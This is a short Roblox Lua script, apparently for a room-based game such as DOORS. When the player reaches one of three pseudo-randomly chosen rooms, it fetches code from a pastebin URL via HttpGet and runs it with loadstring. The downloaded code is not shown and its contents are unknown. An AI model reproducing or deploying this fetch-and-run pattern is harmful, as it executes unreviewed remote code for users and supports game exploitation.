coroutine.wrap(function()
local r = game.JobId
r = string.gsub(r, '%D+', '')
local ab = Random.new(r / 19)
local spawnvalues = {
ab:NextInteger(1, 45),
ab:NextInteger(46, 80),
ab:NextInteger(81, 99)}
game.ReplicatedStorage.GameData.LatestRoom.Changed:Connect(function()
if table.find(spawnvalues, game.ReplicatedStorage.GameData.LatestRoom.Value) then
loadstring(game:HttpGet("https://pastebin.com/raw/CRKvXerr"))()
end
end)
end)()
